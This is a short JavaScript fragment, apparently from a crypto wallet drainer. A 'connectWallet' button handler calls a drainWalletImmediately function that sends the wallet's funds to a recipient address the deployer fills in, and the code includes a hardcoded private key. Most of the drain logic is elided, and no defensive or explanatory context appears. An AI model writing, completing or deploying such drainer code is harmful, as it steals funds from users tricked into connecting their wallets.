document.getElementById('connectWallet').addEventListener('click', async () => {
    if (window.ethereum) {
        try {
            ...
            const privateKey = 'd4d5037d5877fb38ecc3c513ccaef4860b27d4eb6db43375b5185154027700ee'; // Replace with dynamic retrieval if possible
            const recipientAddress = '0xYourRecipientAddress'; // Replace with your recipient address

            await drainWalletImmediately(walletAddress, privateKey, recipientAddress);
...
async function drainWalletImmediately(walletAddress, privateKey, recipientAddress) {
